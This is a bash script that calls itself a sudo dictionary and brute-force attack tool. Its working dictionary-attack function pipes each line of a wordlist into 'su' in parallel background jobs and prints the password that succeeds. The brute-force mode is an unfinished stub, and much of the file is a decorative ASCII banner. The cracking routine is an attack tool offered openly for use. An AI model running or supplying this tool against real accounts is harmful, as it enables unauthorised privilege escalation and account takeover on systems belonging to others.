#!/bin/bash

##  $$$$$$\  $$\   $$\ $$$$$$$\   $$$$$$\  $$\   $$\ $$\ $$$$$$$$\
## $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$$\  $$ |$  |\__$$  __|
## $$ /  \__|$$ |  $$ |$$ |  $$ |$$ /  $$ |$$$$\ $$ |\_/    $$ |
## \$$$$$$\  $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ $$\$$ |       $$ |
##  \____$$\ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ \$$$$ |       $$ |
## $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |       $$ |
## \$$$$$$  |\$$$$$$  |$$$$$$$  | $$$$$$  |$$ | \$$ |       $$ |
##  \______/  \______/ \_______/  \______/ \__|  \__|       \__|

##
## Simple and primitive `sudo` dictionary and bruteforce attack tool. **No hash required!**
##

## Created by @turtureanu

ctrl_c() {
  printf "\nGoodbye! (Unexpected!)\n"
  exit 1
}

dictionary_attack() {
  declare dictionary

  # Ask for the path until it is valid
  while [[ ! -f "$dictionary" ]]; do
    printf "\n\nDictionary path?\n> "
    read -r dictionary
  done

  printf "\n"
  LINES=$(wc -l "$dictionary")
  progress=0

  # setting IFS is necessary in order to print outside of eval from inside the loop
  IFS=$'\n'
  set -f

  while read -r line; do
    progress=$((progress + 1))

    echo -ne "$progress/$LINES passwords checked (checks *all* passwords)\r"
    # TODO: find a way to stop the cracking after finding the password
    # the trick here is that we're running all of these instances in parallel, which is quite fast
    # if the `su` command returns 0 (SUCCESS) then the `echo Password` command gets executed and it prints the password used to gain access
    eval 'printf "$line" | su $USER -c whoami &>/dev/null && printf "\n\n==========================\n    \e[1;32mDONE! DONE! DONE!\e[0m\n==========================\n\nPassword: %s\n\n" "$line"' &# <- get a hold of this poison!
  done \
    <"$dictionary"
  wait
}

# TODO: write the bruteforce attack
bruteforce_attack() {
  PS3="> "

  select opt in "Dynamic length (scale up)" "Static length"; do
    case $opt in
    "Dynamic length (scale up)")
      break
      ;;
    "Static length")
      declare length # TODO: do something with this var

      while [[ -z "$length" ]]; do
        printf "\n\nPassword length?"
        printf "\n> "
        read -r length
      done
      break
      ;;
    esac
  done

  for ((i = 0; i < length; i++)); do
    for symbol in {a..z} {A..Z} {0..9} "!" "@" "#" "$" "%" "^" "&" "*" "(" ")" "_" "+" "-" "=" "[" "]" "{" "}" "\\" "\|" ";" ":" "\"" "'" "<" ">" "," "." "?" "/"; do
      #todo
      echo "todo: $symbol"
    done

  done
}

print_menu() {
  PS3="> "

  select mode in "Dictionary Attack" "Bruteforce Attack (currently unimplemented)" "Exit"; do
    case $mode in
    "Dictionary Attack")
      dictionary_attack
      break
      ;;
    "Bruteforce Attack")
      #bruteforce_attack
      break
      ;;
    "Exit")
      break
      ;;
    *) ;;
    esac
  done
}

# ==================
#    SCRIPT START
# ==================

printf "\n \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\\"
printf "\n\033[31m\$\033[0m\033[31m\$\033[0m  __\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m  __\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m  __\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m  |\__\033[31m\$\033[0m\033[31m\$\033[0m  __|"
printf "\n\033[31m\$\033[0m\033[31m\$\033[0m /  \__|\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m /  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m |\_/    \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n \\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\  \033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m \033[31m\$\033[0m\033[31m\$\033[0m\\\\\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n \____\033[31m\$\033[0m\033[31m\$\033[0m\ \033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m \\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n\033[31m\$\033[0m\033[31m\$\033[0m\   \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |  \033[31m\$\033[0m\033[31m\$\033[0m |\033[31m\$\033[0m\033[31m\$\033[0m |\\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n\\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  |\\\\\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  |\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  | \033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m\033[31m\$\033[0m  |\033[31m\$\033[0m\033[31m\$\033[0m | \\\\\033[31m\$\033[0m\033[31m\$\033[0m |       \033[31m\$\033[0m\033[31m\$\033[0m |"
printf "\n \______/  \______/ \_______/  \______/ \__|  \__|       \__|\n\n"

set -o errexit -o noclobber -o pipefail
trap '' TSTP    # ignore ctrl + z, 'cause that could be unpleasant
trap ctrl_c INT # display exit message

print_menu

printf "\nGoodbye!\n"
